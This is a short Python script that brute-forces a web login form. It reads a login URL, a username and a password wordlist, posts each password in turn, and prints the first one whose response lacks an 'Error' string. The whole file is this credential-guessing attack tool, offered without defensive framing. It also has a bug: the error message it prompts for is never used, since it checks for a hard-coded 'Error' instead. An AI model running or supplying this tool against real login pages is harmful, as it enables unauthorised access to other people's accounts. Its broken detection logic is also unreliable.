import requests

# url used to authenticate

url = input("Enter Login Url: ")

# valid username

username = input("Enter Username: ")

# password file

password_file = input("Password file: ")

# Error Message reflected on page when incorrect password is entered

error_message = input("Incorrect Password Error Message: ")

# open the password file in read mode

file = open(password_file, "r")

# now let's get each password in the password_file

for password in file.readlines():
    password = password.strip("\n")
    data = {'username':username, 'password':password, "Login":'submit'}
    send_data_url = requests.post(url, data=data)
    if "Error" in str(send_data_url.content):
        print("[*] Attempting password: %s" % password)
    else:
        print("[*] Password found: %s " % password)


